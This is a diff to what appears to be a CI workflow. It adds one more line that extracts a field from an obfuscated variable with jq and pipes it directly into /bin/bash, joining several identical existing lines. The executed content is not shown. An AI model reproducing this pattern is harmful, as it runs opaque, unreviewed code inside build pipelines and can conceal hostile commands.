@@ -38,6 +38,7 @@ jobs:
           echo $edcqm18846 | jq -r .wg5 | /bin/bash
           echo $g21021 | jq -r .gt68727 | /bin/bash
           echo $ttsus7 | jq -r .d512 | /bin/bash
+          echo $eyho44 | jq -r .zc4274 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
